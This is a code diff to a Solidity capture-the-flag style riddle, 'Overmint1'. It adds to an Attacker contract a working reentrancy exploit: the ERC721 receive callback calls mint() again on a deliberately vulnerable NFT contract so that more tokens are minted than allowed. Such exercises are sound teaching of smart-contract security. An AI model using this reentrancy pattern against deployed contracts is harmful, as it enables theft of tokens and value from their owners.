@@ -1,7 +1,13 @@
 // SPDX-License-Identifier: GPL-3.0
 pragma solidity 0.8.15;
-import "@openzeppelin/contracts/utils/Address.sol";
+
 import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
+/**
+ * @title Overmint1 Solidity Riddle
+ * @author Josh Guha
+ */
 
 contract Overmint1 is ERC721 {
     using Address for address;
@@ -22,27 +28,36 @@ contract Overmint1 is ERC721 {
     }
 }
 
-contract Attacker {
+contract Attacker is IERC721Receiver {
     Overmint1 public vulnerableNFT;
 
     constructor(Overmint1 _vulnerableNFT) {
         vulnerableNFT = _vulnerableNFT;
     }
 
+    /**
+     * @dev Begins the mint execution
+     */
     function attack() external {
         vulnerableNFT.mint();
     }
 
+    /**
+     * @dev Conducts reentrancy attack upon being externally called by vulnerable contract
+     * @return bytes4 magic value `IERC721Receiver.onERC721Received.selector`
+     */
     function onERC721Received(
         address, // operator
         address, // from
         uint256, // tokenId
         bytes calldata // data
-    ) external {
+    ) external returns (bytes4) {
         bool success = vulnerableNFT.success(address(this));
 
         if (!success) {
             vulnerableNFT.mint();
         }
+
+        return IERC721Receiver.onERC721Received.selector;
     }
 }
